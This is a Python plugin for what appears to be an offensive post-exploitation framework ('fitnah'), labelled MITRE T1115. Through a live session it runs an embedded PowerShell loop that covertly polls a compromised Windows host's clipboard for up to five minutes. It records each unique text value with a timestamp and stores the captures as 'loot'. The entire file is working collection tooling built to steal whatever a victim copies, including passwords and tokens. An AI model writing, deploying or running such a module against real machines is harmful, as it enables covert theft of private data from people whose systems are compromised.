"""collection/clipboard_monitor — poll clipboard for N seconds and collect unique values. MITRE T1115"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ClipboardMonitor(BasePlugin):
    NAME        = "clipboard_monitor"
    DESCRIPTION = (
        "Poll clipboard every 500 ms for a given duration, collect all unique text values, "
        "deduplicate, and optionally save to loot."
    )
    AUTHOR      = "fitnah-team"
    MITRE       = "T1115"
    CATEGORY    = "collection"
    schema      = ParamSchema().add(
        Param("duration",  str, required=False, default="10",
              help="Number of seconds to monitor the clipboard"),
        Param("save_loot", str, required=False, default="true",
              help="Save captured clipboard values to loot (true/false)"),
    )

    @mitre("T1115")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        try:
            duration = int(params.get("duration", "10"))
        except (ValueError, TypeError):
            return ModuleResult.err("duration must be an integer number of seconds")

        save_loot_str = str(params.get("save_loot", "true")).lower()
        save_loot = save_loot_str not in ("false", "0", "no", "off")

        if duration <= 0:
            return ModuleResult.err("duration must be > 0")

        # Cap at 300 seconds to avoid indefinite blocking
        duration = min(duration, 300)

        iterations = duration * 2  # 500 ms intervals

        ps = (
            # Load Windows.Forms for clipboard access
            "Add-Type -Assembly 'System.Windows.Forms' -EA Stop 2>&1 | Out-Null;"
            "$seen    = [System.Collections.Generic.HashSet[string]]::new();"
            "$results = [System.Collections.Generic.List[object]]::new();"
            f"$iters   = {iterations};"
            "$i = 0;"
            "while ($i -lt $iters) {"
            "  $i++;"
            "  try {"
            "    $text = [System.Windows.Forms.Clipboard]::GetText();"
            "    if ($text -and $text.Length -gt 0 -and $seen.Add($text)) {"
            "      $ts  = Get-Date -Format 'HH:mm:ss';"
            "      $results.Add([PSCustomObject]@{Time=$ts; Value=$text});"
            "    }"
            "  } catch { }"
            "  Start-Sleep -Milliseconds 500"
            "};"
            "if ($results.Count -eq 0) {"
            "  Write-Output '[clipboard_monitor] No clipboard activity detected.';"
            "} else {"
            f"  Write-Output \"[clipboard_monitor] Captured $($results.Count) unique value(s) over {duration}s:\";"
            "  Write-Output ('-' * 60);"
            "  foreach ($r in $results) {"
            "    $preview = if ($r.Value.Length -gt 120) { $r.Value.Substring(0,120) + '...' } else { $r.Value };"
            "    Write-Output \"[$($r.Time)] $preview\";"
            "    Write-Output ''"
            "  }"
            "}"
        )

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")

        output = r.get("output", "")

        if save_loot:
            return ModuleResult.ok(
                data=output,
                loot_kind="clipboard",
            )
        return ModuleResult.ok(data=output)
